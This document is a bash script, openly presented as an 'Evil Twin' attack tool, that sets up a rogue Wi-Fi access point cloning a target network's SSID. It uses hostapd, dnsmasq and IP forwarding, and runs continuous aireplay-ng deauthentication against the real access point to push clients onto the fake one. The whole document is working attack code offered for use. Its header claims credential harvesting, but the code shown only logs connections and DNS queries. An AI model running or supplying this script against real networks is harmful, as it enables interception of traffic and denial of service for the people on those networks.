#!/bin/bash

# Evil Twin Attack - Rogue AP with credential harvesting
# Creates fake AP to capture credentials

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_info() { echo -e "${GREEN}[+]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
print_error() { echo -e "${RED}[-]${NC} $1"; }

if [ "$EUID" -ne 0 ]; then
    print_error "Run as root"
    exit 1
fi

INTERFACE="$1"
TARGET_SSID="$2"
TARGET_BSSID="$3"
TARGET_CHANNEL="$4"

if [ -z "$INTERFACE" ] || [ -z "$TARGET_SSID" ]; then
    echo "Usage: $0 <interface> <target_ssid> <target_bssid> <channel>"
    exit 1
fi

OUTPUT_DIR="./evil_twin_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

print_info "Setting up Evil Twin AP: $TARGET_SSID"

# Create hostapd configuration
cat > "$OUTPUT_DIR/hostapd.conf" << EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$TARGET_CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
EOF

# Create dnsmasq configuration
cat > "$OUTPUT_DIR/dnsmasq.conf" << EOF
interface=$INTERFACE
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF

# Setup network
print_info "Configuring network..."
ifconfig "$INTERFACE" up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start services
print_info "Starting hostapd..."
hostapd "$OUTPUT_DIR/hostapd.conf" &
HOSTAPD_PID=$!

sleep 3

print_info "Starting dnsmasq..."
dnsmasq -C "$OUTPUT_DIR/dnsmasq.conf" -d &
DNSMASQ_PID=$!

# Deauth original AP to force clients to connect
print_info "Deauthenticating clients from original AP..."
aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$INTERFACE" &
DEAUTH_PID=$!

print_info "Evil Twin AP is running!"
print_info "Clients connecting will be logged"
print_warning "Press Ctrl+C to stop"

# Cleanup function
cleanup() {
    print_info "Cleaning up..."
    kill $HOSTAPD_PID $DNSMASQ_PID $DEAUTH_PID 2>/dev/null || true
    echo 0 > /proc/sys/net/ipv4/ip_forward
    print_info "Stopped"
}

trap cleanup INT TERM EXIT

# Monitor connections
tail -f /var/log/syslog | grep -i "dhcp\|hostapd"
